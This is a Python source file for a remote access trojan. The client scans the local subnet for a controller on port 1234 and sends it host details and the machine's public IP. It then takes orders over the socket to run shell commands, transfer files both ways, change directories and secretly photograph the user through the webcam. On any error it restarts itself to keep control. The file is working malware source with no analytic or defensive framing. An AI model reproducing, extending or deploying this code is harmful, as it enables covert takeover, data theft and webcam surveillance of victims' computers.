# coding: utf-8
import socket
from platform import system, release, version, machine
from requests import get
import json
import threading
import os
from sys import executable, argv
import subprocess
import cv2

port_server = 1234
system_info = {}
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def handle_connection():
    s = socket.gethostbyname(socket.gethostname())
    argum = s.split(".")
    for i in range(257):
        argum[3] = i
        ip_server = f"{argum[0]}.{argum[1]}.{argum[2]}.{argum[3]}"
        print(ip_server)
        try:
            sock.connect((ip_server, port_server))
            break
        except:
            pass
        else:
            handle_connection()

def send_system_info():
    system_info["platform"] =  system()
    system_info['platform-release']= release()
    system_info['platform-version']= version()
    system_info['architecture']= machine()
    system_info['hostname']= socket.gethostname()
    try:
        system_info["public_ip"] = get('https://api.ipify.org').text
    except:
        pass
    
    json_sys = json.dumps(system_info)
    sock.send(bytes(json_sys, "utf-8"))

def wait_command():
    while True:
        try:
            command = sock.recv(1024).decode("utf-8")
            array_command = command.split(" ")
            if command == "get_info":
                send_system_info()

            elif command == "list":
                data = str(os.listdir("."))
                sock.send(bytes(data, "utf-8"))

            elif array_command[0] == "start":
                try:
                    subprocess.call(array_command[1])
                except:
                    pass

            elif array_command[0] == "input":
                 cmd = subprocess.run(array_command[1:], shell=True, capture_output=True, text = True)
                 if cmd.returncode > 0:
                    sock.send(bytes(cmd.stderr, "utf-8")) 
                 else:
                    print(cmd.stdout)
                    print(type(cmd.stdout))
                    sock.send(bytes(cmd.stdout, "utf-8"))

            elif array_command[0] == "download":
                st = round(os.stat(array_command[1]).st_size)
                sock.send(bytes(str(st), "utf-8"))
                file = open(array_command[1] , 'rb')
                file_data = file.read(st)
                sock.send(file_data)
                file.close()

            elif array_command[0] == "send_file":
                size = int(sock.recv(1024).decode("utf-8"))
                file = open(array_command[1], 'wb')
                data = sock.recv(size)
                file.write(data)
                file.close()   

            elif array_command[0] == "cd":
                try:
                    os.chdir(array_command[1])
                    sock.send(bytes(f"Changed directory to {os.getcwd()}", "utf-8"))
                except:
                    sock.send(bytes("err", "utf-8"))

            elif command == "cdir":
                dir = os.getcwd()
                sock.send(bytes(dir, "utf-8"))

            elif array_command[0] == "img":
                camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                return_value, image = camera.read()
                cv2.imwrite(array_command[1], image)
                camera.release() 
                cv2.destroyAllWindows()
                st = round(os.stat(array_command[1]).st_size)
                sock.send(bytes(str(st), "utf-8"))
                file = open(array_command[1] , 'rb')
                file_data = file.read(st)
                sock.send(file_data)
                file.close()
                os.remove(array_command[1])

        except:
            python = executable
            os.execl(python, python, * argv)

if __name__ == "__main__":
    func_1 = threading.Thread(target=wait_command)
    
    handle_connection()
    func_1.start()
